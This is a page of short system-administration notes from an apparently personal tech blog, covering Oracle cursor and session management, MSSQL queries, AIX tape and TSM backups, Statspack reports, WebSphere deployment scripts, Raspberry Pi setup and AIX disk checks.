<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://github.com/Gadgetoid/WiringPi2-Python">https://github.com/Gadgetoid/WiringPi2-Python</a><br><a target="_blank" rel="noopener" href="http://wiringpi.com/">http://wiringpi.com/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-ORA-01000-maximum-open-cursors-exceeded" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-01-10T05:30:21.000Z"><a href="/2013/01/10/ORA-01000-maximum-open-cursors-exceeded/">2013-01-10</a></time>
      
      
  
    <h1 class="title"><a href="/2013/01/10/ORA-01000-maximum-open-cursors-exceeded/">ORA-01000 maximum open cursors exceeded</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Get-detail-of-opened-cursors-current"><a href="#Get-detail-of-opened-cursors-current" class="headerlink" title="Get detail of opened cursors current"></a>Get detail of opened cursors current</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select * from gv$sysstat where name like &#x27;%open%&#x27;</span><br><span class="line"></span><br><span class="line">select sum(a.value) total_cur, avg(a.value) avg_cur, max(a.value) max_cur,</span><br><span class="line">s.username, s.machine</span><br><span class="line">from gv$sesstat a, gv$statname b, gv$session s</span><br><span class="line">where a.statistic# = b.statistic#  and s.sid=a.sid</span><br><span class="line">and b.name = &#x27;opened cursors current&#x27;</span><br><span class="line">group by s.username, s.machine</span><br><span class="line">order by 1 desc;</span><br></pre></td></tr></table></figure>

<h1 id="Update-open-cursors"><a href="#Update-open-cursors" class="headerlink" title="Update open_cursors"></a>Update open_cursors</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show parameter open_cursors;</span><br><span class="line"></span><br><span class="line">alter system set open_cursors=1000 scope=MEMORY; (如果启动时候定义了spfile,可以写scope=BOTH)</span><br></pre></td></tr></table></figure>

<h1 id="Kill-session-to-let-the-parameter-take-effect"><a href="#Kill-session-to-let-the-parameter-take-effect" class="headerlink" title="Kill session to let the parameter take effect"></a>Kill session to let the parameter take effect</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">       substr(a.spid,1,9) pid,</span><br><span class="line">       substr(b.sid,1,5) sid,</span><br><span class="line">       substr(b.serial#,1,5) ser#,</span><br><span class="line">       substr(b.machine,1,6) box,</span><br><span class="line">       substr(b.username,1,10) username,</span><br><span class="line">--       b.server,</span><br><span class="line">       substr(b.osuser,1,8) os_user,</span><br><span class="line">       substr(b.program,1,30) program</span><br><span class="line">from gv$session b, gv$process a</span><br><span class="line">where</span><br><span class="line">b.paddr = a.addr</span><br><span class="line">and type=&#x27;USER&#x27;</span><br><span class="line">order by program, sid;</span><br><span class="line"></span><br><span class="line">alter system kill session &#x27;SID,SERIAL#&#x27;</span><br><span class="line">e.g. alter system kill session &#x27;12,2653&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="http://superlee0815.blog.163.com/blog/static/10575132120091585954516/">http://superlee0815.blog.163.com/blog/static/10575132120091585954516/</a><br><a target="_blank" rel="noopener" href="http://blog.itpub.net/9399028/viewspace-695082">http://blog.itpub.net/9399028/viewspace-695082</a><br><a target="_blank" rel="noopener" href="https://community.oracle.com/thread/362096">https://community.oracle.com/thread/362096</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-List-grantee-right-in-oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-12-21T01:38:58.000Z"><a href="/2012/12/21/List-grantee-right-in-oracle/">2012-12-21</a></time>
      
      
  
    <h1 class="title"><a href="/2012/12/21/List-grantee-right-in-oracle/">List grantee right in oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create user xx identified by password;</span><br><span class="line"></span><br><span class="line">grant create session to xx;</span><br><span class="line">grant select on USER to xx;</span><br><span class="line">grant select on PAYMENT to xx;</span><br><span class="line">grant select on COMPANY to xx;</span><br><span class="line"></span><br><span class="line">select * from user_tab_privs where grantee = &#x27;xx&#x27;</span><br><span class="line"></span><br><span class="line">select * from sys.all_tables;</span><br><span class="line">select * from sys.all_synonyms;</span><br><span class="line">select * from sys.all_views;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Show-Info-about-MSSQL-Server" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-11-28T08:59:19.000Z"><a href="/2012/11/28/Show-Info-about-MSSQL-Server/">2012-11-28</a></time>
      
      
  
    <h1 class="title"><a href="/2012/11/28/Show-Info-about-MSSQL-Server/">Show Info about MSSQL Server</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h3 id="Show-all-tables"><a href="#Show-all-tables" class="headerlink" title="Show all tables"></a>Show all tables</h3><p>  <code>select * from information_schema.tables</code></p>
<h3 id="Show-user-privilege"><a href="#Show-user-privilege" class="headerlink" title="Show user privilege"></a>Show user privilege</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES</span><br><span class="line">exec sp_helprotect</span><br></pre></td></tr></table></figure>

<h3 id="Change-password-of-sa"><a href="#Change-password-of-sa" class="headerlink" title="Change password of sa"></a>Change password of sa</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">osql -S yourservername -E</span><br><span class="line">1&gt; EXEC sp_password NULL, &#x27;yourpassword&#x27;, &#x27;sa&#x27;</span><br><span class="line">2&gt; GO</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-dds4-and-tsm-backup" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-11-23T05:25:57.000Z"><a href="/2012/11/23/dds4-and-tsm-backup/">2012-11-23</a></time>
      
      
  
    <h1 class="title"><a href="/2012/11/23/dds4-and-tsm-backup/">dds4 and tsm backup</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h1><p> <code>find /tmp/forest | backup -ivqf /dev/rmt0</code></p>
<h2 id="Commands-of-controlling-DDS4-tape"><a href="#Commands-of-controlling-DDS4-tape" class="headerlink" title="Commands of controlling DDS4 tape"></a>Commands of controlling DDS4 tape</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mt -t /dev/rmt0 rewind</span><br><span class="line">mt -t /dev/rmt0 offline</span><br></pre></td></tr></table></figure>

<h1 id="Daily-backup"><a href="#Daily-backup" class="headerlink" title="Daily backup:"></a>Daily backup:</h1><h2 id="Backup-x2F-dh-x2F-db-x2F-bkup-x2F-exp-x2F-exp-ora-dow-dmp-gz"><a href="#Backup-x2F-dh-x2F-db-x2F-bkup-x2F-exp-x2F-exp-ora-dow-dmp-gz" class="headerlink" title="Backup &#x2F;dh&#x2F;db&#x2F;bkup&#x2F;exp&#x2F;exp_ora_{dow}.dmp.gz"></a>Backup &#x2F;dh&#x2F;db&#x2F;bkup&#x2F;exp&#x2F;exp_ora_{dow}.dmp.gz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">restore -Tvqf /dev/rmt0 (View)</span><br><span class="line">restore -Tqdvf /dev/rmt0 /dh/db/bkup/exp</span><br><span class="line">restore -rvqf /dev/rmt0 (Restore)</span><br><span class="line">restore -xvqf /dev/rmt0</span><br><span class="line">restore -xdvqf /dev/rmt0 /dh/db/bkup/exp</span><br></pre></td></tr></table></figure>

<h2 id="Weekly-backup-system-backup"><a href="#Weekly-backup-system-backup" class="headerlink" title="Weekly backup(system backup):"></a>Weekly backup(system backup):</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">restore -s4 -Tvqf /dev/rmt0.1 (View)</span><br><span class="line">lsmksysb -f /dev/rmt0</span><br><span class="line">restore -s4 -rvqf /dev/rmt0.1 (Restore)</span><br></pre></td></tr></table></figure>

<p>  <a target="_blank" rel="noopener" href="http://www.oucs.ox.ac.uk/hfs/backup/allcli/index.xml?splitLevel=-1">http://www.oucs.ox.ac.uk/hfs/backup/allcli/index.xml?splitLevel=-1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsmc restore /dh/db/bkup/exp/exp_ora_1.dmp.gz</span><br><span class="line">dsmc restore /dh/db/bkup/exp/exp_ora_1.dmp.gz /tmp/xx/</span><br><span class="line">dsmc restore /dh/db/bkup/exp/* /tmp/xx/</span><br><span class="line">dsmc query file</span><br><span class="line">dsmc query backup &quot;/dh/db/bkup/*&quot; -subdir=yes</span><br><span class="line">dsmc q ba &quot;/dsmdb/bkup/exp/*&quot; -subdir=yes (-inactive)</span><br><span class="line">dsmc q ba &quot;/dh/db/bkup/arch/*&quot; -su=yes</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-System-Performance-Statistics-Report-Summary" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-11-20T05:17:22.000Z"><a href="/2012/11/20/System-Performance-Statistics-Report-Summary/">2012-11-20</a></time>
      
      
  
    <h1 class="title"><a href="/2012/11/20/System-Performance-Statistics-Report-Summary/">System Performance Statistics Report Summary</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="statpack"><a href="#statpack" class="headerlink" title="statpack"></a>statpack</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lt /sharedrive/data/statpack_result | grep MM</span><br><span class="line">/sharedrive/scripts/perfstat/spreport.sh MM</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlplus perfstat/password@&quot;(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=DBServer)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=xxrac)))&quot;</span><br><span class="line">@$ORACLE_HOME/rdbms/admin/spreport.sql</span><br><span class="line">@?/rdbms/admin/spreport.sql</span><br><span class="line">@$ORACLE_HOME/rdbms/admin/sppurge.sql</span><br></pre></td></tr></table></figure>

<h2 id="find-max-min-snap-id"><a href="#find-max-min-snap-id" class="headerlink" title="find max, min snap_id"></a>find max, min snap_id</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select startup_time, count(1) from STATS$snapshot where snap_time between to_date(&#x27;2014-11-01&#x27;, &#x27;yyyy-mm-dd&#x27;) and to_date(&#x27;2014-11-30&#x27;, &#x27;yyyy-mm-dd&#x27;) group by startup_time;</span><br><span class="line"></span><br><span class="line">select * from STATS$snapshot where snap_time between to_date(&#x27;2014-11-01&#x27;, &#x27;yyyy-mm-dd&#x27;) and to_date(&#x27;2014-11-30&#x27;, &#x27;yyyy-mm-dd&#x27;) and to_char(startup_time, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;) = &#x27;2014-10-16 18:42:52&#x27; order by snap_id;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://burleson-dba.com/SP/">http://burleson-dba.com/SP/</a></p>
<h1 id="performance-statistic"><a href="#performance-statistic" class="headerlink" title="performance statistic"></a>performance statistic</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/aix-combine-csv-daily-to-csv-month-parameter.sh Server 2015 07</span><br><span class="line">/aix-calc-monthly-avg.sh Server 2015 07 </span><br><span class="line">/aix-calc-monthly-avg.sh Server 2015 07 | awk  -F &#x27;,&#x27;  &#x27;&#123;print $2&quot;,&quot;$4&quot;M&quot;&#125;&#x27;</span><br><span class="line">/aix-calc-monthly-avg.sh Server 2015 07 | awk  -F &#x27;,&#x27;  &#x27;&#123;print $2&quot;,&quot;$5&quot;%&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">select df.tablespace_name &quot;Tablespace&quot;,</span><br><span class="line">round(100 * ( (df.totalspace - tu.totalusedspace)/ df.totalspace)) || &#x27;%&#x27;</span><br><span class="line">&quot;Pct. Free&quot;</span><br><span class="line">from</span><br><span class="line">(select tablespace_name,</span><br><span class="line">round(sum(bytes) / 1048576) TotalSpace</span><br><span class="line">from dba_data_files </span><br><span class="line">group by tablespace_name) df,</span><br><span class="line">(select round(sum(bytes)/(1024*1024)) totalusedspace, tablespace_name</span><br><span class="line">from dba_segments </span><br><span class="line">group by tablespace_name) tu</span><br><span class="line">where df.tablespace_name = tu.tablespace_name order by df.tablespace_name ;</span><br></pre></td></tr></table></figure>


<h1 id="WEB-server"><a href="#WEB-server" class="headerlink" title="WEB server"></a>WEB server</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\perfstat-bin\convert\relog-daily-blg-to-monthly-csv.bat 201501</span><br><span class="line">./relog-daily-blg-to-monthly-csv.bat 201501</span><br><span class="line">check D:\perfstat-csv</span><br><span class="line"></span><br><span class="line">cd /cygdrive/d/perfstat-bin/convert</span><br><span class="line">relog ../../PerfLogs/Web_201506*.blg -cf relog-parameters.txt -f csv -o ../../perfstat-csv/Web_201506.csv</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Websphere-deployment-with-script" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-11-14T01:15:57.000Z"><a href="/2012/11/14/Websphere-deployment-with-script/">2012-11-14</a></time>
      
      
  
    <h1 class="title"><a href="/2012/11/14/Websphere-deployment-with-script/">Websphere deployment with script</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$AdminApp install &quot;/tmp/xx/session_replication/weiwei.ear&quot; &#123;-contextroot weiwei -appname WeiWeiEAR -node psuat -cell psuat -server server4 -MapWebModToVH &#123;&#123;&quot;weiwei&quot; weiwei.war,WEB-INF/web.xml default_host&#125;&#125; -MapResRefToEJB &#123;&#123;weiwei &quot;&quot; weiwei.war,WEB-INF/web.xml jdbc/psuat javax.sql.DataSource jdbc/psuat&#125;&#125; -MapModulesToServers &#123;&#123;weiwei weiwei.war,WEB-INF/web.xml WebSphere:cell=psuat,node=psuat,server=server4&#125;&#125; -installdir /piers/apps/uat/installedApps -verbose -nodeployws&#125; </span><br><span class="line">$AdminApp install &quot;/tmp/xx/weiwei.ear&quot; &#123;-contextroot weiwei -appname WeiWeiEAR -MapWebModToVH &#123;&#123;&quot;weiwei&quot; weiwei.war,WEB-INF/web.xml default_host&#125;&#125; -MapResRefToEJB &#123;&#123;weiwei &quot;&quot; weiwei.war,WEB-INF/web.xml jdbc/dhprd javax.sql.DataSource jdbc/dhprd&#125;&#125; -MapModulesToServers &#123;&#123;weiwei weiwei.war,WEB-INF/web.xml WebSphere:cell=dhwap02Network,cluster=dhwas_cluster&#125;&#125; -installdir /xx/apps/prod/installedApps -cluster xx_was -verbose -nodeployws&#125; </span><br><span class="line"></span><br><span class="line">$AdminConfig save </span><br><span class="line">$AdminApp isAppReady sr </span><br><span class="line">$AdminApp getDeployStatus sr </span><br><span class="line"></span><br><span class="line">$AdminApp list </span><br><span class="line">$AdminApp listModules sr </span><br><span class="line"></span><br><span class="line">set appManager [$AdminControl queryNames type=ApplicationManager,*] </span><br><span class="line">$AdminControl invoke $appManager startApplication sr </span><br><span class="line">$AdminControl invoke $appManager stopApplication sr </span><br><span class="line"></span><br><span class="line">$AdminApp uninstall sr </span><br><span class="line"></span><br><span class="line">$AdminApp options /piers/apps/uat/installedApps/WeiWeiEAR.ear </span><br><span class="line">$AdminApp taskInfo /piers/apps/uat/installedApps/WeiWeiEAR.ear MapResRefToEJB </span><br><span class="line">$AdminApp taskInfo /piers/apps/uat/installedApps/WeiWeiEAR.ear MapModulesToServers </span><br><span class="line">$AdminApp taskInfo /piers/apps/uat/installedApps/WeiWeiEAR.ear MapWebModToVH </span><br><span class="line">$AdminApp taskInfo /piers/apps/uat/installedApps/eps.ear AppDeploymentOptions </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$AdminControl queryNames &quot;*:*&quot; </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Raspberry-Practice" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-10-31T05:44:31.000Z"><a href="/2012/10/31/Raspberry-Practice/">2012-10-31</a></time>
      
      
  
    <h1 class="title"><a href="/2012/10/31/Raspberry-Practice/">Raspberry Practice</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ol>
<li>Run raspi-config to set parameter</li>
<li>Login as pi&#x2F;raspberry, sudo passwd root</li>
<li>Run sudo vi &#x2F;boot&#x2F;config.txt to set framebuffer</li>
<li>Install JDK1.8.0 and run javafx samples  <a target="_blank" rel="noopener" href="http://javafx.steveonjava.com/javafx-on-raspberry-pi-3-easy-steps">http://javafx.steveonjava.com/javafx-on-raspberry-pi-3-easy-steps</a></li>
<li>Install Tomcat</li>
<li>Install TightVNC <a target="_blank" rel="noopener" href="http://www.neil-black.co.uk/raspberry-pi-beginners-guide">raspberry-pi-beginners-guide</a> <a target="_blank" rel="noopener" href="http://www.penguintutor.com/linux/tightvnc">tightvnc</a></li>
<li>Install transmission-daemon, transmission-remote-gui&#x2F;java remember to disable rpc-white-list and set the login user&#x2F;password <a target="_blank" rel="noopener" href="http://www.lijingquan.net/pt-linux-vps.html">pt-linux-vps</a> <a target="_blank" rel="noopener" href="http://www.webupd8.org/2009/12/setting-up-transmission-remote-gui-in.html">setting-up-transmission-remote-gui-in</a></li>
<li>Install samba <code>sudo apt-get install samba</code><br>  &#x2F;etc&#x2F;samba&#x2F;smb.conf<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[bt-download]</span><br><span class="line">comment = transmission download folder</span><br><span class="line">browsable = yes</span><br><span class="line">path = /var/lib/transmission-daemon/downloads</span><br><span class="line">public = yes</span><br><span class="line">writable = yes</span><br><span class="line">guest ok = yes</span><br></pre></td></tr></table></figure></li>
<li>Install chromium <code>sudo apt-get install chromium</code></li>
<li>Install wiringPi <a target="_blank" rel="noopener" href="https://projects.drogon.net/raspberry-pi/wiringpi/download-and-install">https://projects.drogon.net/raspberry-pi/wiringpi/download-and-install</a></li>
<li>Install xrdp (ru tightvncserver in backend imho) <code>sudo apt-get install xrdp</code></li>
<li>Install bluetooth <code>sudo apt-get install bluez blueman</code></li>
<li>Install mpd <code>sudo apt-get install mpd mpc icecast2</code><br>set bind_to_address to 0.0.0.0 in mpd.conf<br>uncomment the block Icecast of audio_output<br><a target="_blank" rel="noopener" href="http://www.t3node.com/blog/streaming-audio-with-mpd-and-icecast2-on-raspberry-pi/">streaming-audio-with-mpd-and-icecast2-on-raspberry-pi</a></li>
<li>Install Pifm <a target="_blank" rel="noopener" href="http://www.icrobotics.co.uk/wiki/index.php/Turning_the_Raspberry_Pi_Into_an_FM_Transmitter">Turning_the_Raspberry_Pi_Into_an_FM_Transmitter</a></li>
<li>check revision cat <code>/proc/cpuinfo</code> <a target="_blank" rel="noopener" href="http://elinux.org/RPi_Hub">http://elinux.org/RPi_Hub</a> And <a target="_blank" rel="noopener" href="http://rpitc.blogspot.hk/">http://rpitc.blogspot.hk/</a></li>
</ol>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>  <a target="_blank" rel="noopener" href="http://whatswhat.no/computer/linux/raspberry-pi/481-raspberry-pi-mediacenter-raspbmc-setup-and-use-ipad-or-iphone-as-remote">http://whatswhat.no/computer/linux/raspberry-pi/481-raspberry-pi-mediacenter-raspbmc-setup-and-use-ipad-or-iphone-as-remote</a><br>  <a target="_blank" rel="noopener" href="http://blog.thestateofme.com/2012/05/27/raspberry-pi-on-ipad/">http://blog.thestateofme.com/2012/05/27/raspberry-pi-on-ipad/</a><br>  <a target="_blank" rel="noopener" href="http://www.oracle.com/technetwork/articles/java/raspberrypi-1704896.html">http://www.oracle.com/technetwork/articles/java/raspberrypi-1704896.html</a></p>
<p>  <a target="_blank" rel="noopener" href="http://projectdp.wordpress.com/2012/09/24/pi-k3w-kindle-3-display-for-raspberry-pi/">http://projectdp.wordpress.com/2012/09/24/pi-k3w-kindle-3-display-for-raspberry-pi/</a><br>  <a target="_blank" rel="noopener" href="http://www.raspberrypi.org/">http://www.raspberrypi.org</a><br>  <a target="_blank" rel="noopener" href="https://www.riscosopen.org/news/articles/2012/10/26/risc-os-pi-released-risc-os-for-the-raspberry-pi">https://www.riscosopen.org/news/articles/2012/10/26/risc-os-pi-released-risc-os-for-the-raspberry-pi</a><br>  <a target="_blank" rel="noopener" href="http://www.reddit.com/r/raspberry_pi/comments/zoivv/kindleberry_pi/">http://www.reddit.com/r/raspberry_pi/comments/zoivv/kindleberry_pi/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Resetting-warning-light-on-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-10-31T05:30:22.000Z"><a href="/2012/10/31/Resetting-warning-light-on-AIX/">2012-10-31</a></time>
      
      
  
    <h1 class="title"><a href="/2012/10/31/Resetting-warning-light-on-AIX/">Resetting warning light on AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h1><p>as root, run ‘diag’<br>then select ‘Task Selection’<br>then select ‘Identify and Attention Indicators’<br>then select ‘Set ALL Identify Indicators to NORMAL’ or selectivly as required.</p>
<h1 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h1><p> usr&#x2F;lpp&#x2F;diagnostics&#x2F;bin&#x2F;usysfault -t<br> &#x2F;usr&#x2F;lpp&#x2F;diagnostics&#x2F;bin&#x2F;usysfault -s normal </p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p> <a target="_blank" rel="noopener" href="http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/resetting-warning-light-on-rs6000-2934655">http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/resetting-warning-light-on-rs6000-2934655</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-在AIX上增加文件系统空间" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-10-19T07:22:43.000Z"><a href="/2012/10/19/%E5%9C%A8AIX%E4%B8%8A%E5%A2%9E%E5%8A%A0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%A9%BA%E9%97%B4/">2012-10-19</a></time>
      
      
  
    <h1 class="title"><a href="/2012/10/19/%E5%9C%A8AIX%E4%B8%8A%E5%A2%9E%E5%8A%A0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%A9%BA%E9%97%B4/">在AIX上增加文件系统空间</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="显示活动的卷组"><a href="#显示活动的卷组" class="headerlink" title="显示活动的卷组"></a>显示活动的卷组</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lsvg -o</span><br><span class="line">bkvg</span><br><span class="line">vg01</span><br><span class="line">vg02</span><br><span class="line">rootvg</span><br><span class="line">列出对应的物理卷</span><br><span class="line">dhdev01 / # lsvg -p rootvg</span><br><span class="line">rootvg:</span><br><span class="line">PV_NAME           PV STATE          TOTAL PPs   FREE PPs    FREE DISTRIBUTION</span><br><span class="line">hdisk0            active            546         111         00..00..00..02..109</span><br><span class="line">dhdev01 / # lsvg -p vg01</span><br><span class="line">vg01:</span><br><span class="line">PV_NAME           PV STATE          TOTAL PPs   FREE PPs    FREE DISTRIBUTION</span><br><span class="line">hdisk1            active            546         135         00..00..00..26..109</span><br><span class="line">dhdev01 / # lsvg -p vg02</span><br><span class="line">vg02:</span><br><span class="line">PV_NAME           PV STATE          TOTAL PPs   FREE PPs    FREE DISTRIBUTION</span><br><span class="line">hdisk2            active            546         109         00..00..00..00..109</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dhdev01 / # ls -al /dev/rootvg</span><br><span class="line">crw-rw----   1 root     system       10,  0 Dec 19 2003  /dev/rootvg</span><br></pre></td></tr></table></figure>

